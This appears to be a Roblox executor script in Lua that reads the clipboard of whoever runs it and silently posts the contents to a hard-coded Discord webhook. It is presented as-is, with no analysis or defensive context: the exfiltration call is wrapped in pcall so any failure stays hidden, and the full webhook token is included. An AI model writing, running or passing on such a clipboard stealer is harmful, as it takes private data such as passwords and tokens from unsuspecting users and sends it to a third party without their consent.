local HttpService = game:GetService("HttpService")
local request = request or http_request

local WEBHOOK_URL = "https://discord.com/api/webhooks/1394023221128335471/ehsDY1912p-bavGMlnv-tBIrSDRS_Uqs52sKWQahyCBPwLDdBYXHRwf7BNEMwDuHkyfa"

local clipboardContent = "Unavailable"
if getclipboard then
    clipboardContent = getclipboard()
end

local embed = {
    title = "📋 Clipboard Contents",
    description = "```" .. clipboardContent .. "```",
    color = 0x00FF00,
    footer = { text = "Made With Power Of Intelligence By Me" }
}

local payload = HttpService:JSONEncode({ embeds = { embed } })

pcall(function()
    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = payload
    })
end)
